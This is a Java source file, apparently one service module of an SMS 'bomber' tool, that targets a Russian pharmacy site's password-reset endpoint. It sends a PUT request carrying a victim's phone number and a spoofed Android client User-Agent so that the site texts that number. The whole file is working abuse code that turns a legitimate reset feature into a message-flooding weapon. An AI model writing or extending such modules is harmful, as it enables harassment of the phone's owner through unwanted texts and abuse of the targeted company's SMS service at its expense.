package com.dm.bomber.services;

import org.json.JSONException;
import org.json.JSONObject;

import okhttp3.Request;

public class BudZdorov extends JsonService {

    public BudZdorov() {
        setUrl("https://www.budzdorov.ru/rest/V1/customers/smsAccount/password");
        setMethod(PUT);
        setPhoneCode("7");
    }
    
    @Override
    public Request buildRequest(Request.Builder builder) {
        builder.addHeader("User-Agent", "RiglaMobileClient(android Android-Q-build-20210804020623 2.10.2 (stable) (Tue Oct 13 15:50:27 2020 +0200) on 'android_arm64')");
        builder.addHeader("platform", "android");

        return super.buildRequest(builder);
    }

    @Override
    public String buildJson() {
        JSONObject json = new JSONObject();

        try {
            json.put("contact", format(getFormattedPhone(), "+* (***) ***-**-**"));
            json.put("type", "telephone");
            json.put("template", "email_reset");
            json.put("websiteId", "0");
            json.put("fieldName", "Абоба");
            json.put("fieldValue", "Бебра");
        } catch (JSONException e) {
            e.printStackTrace();
        }

        return json.toString();
    }
}
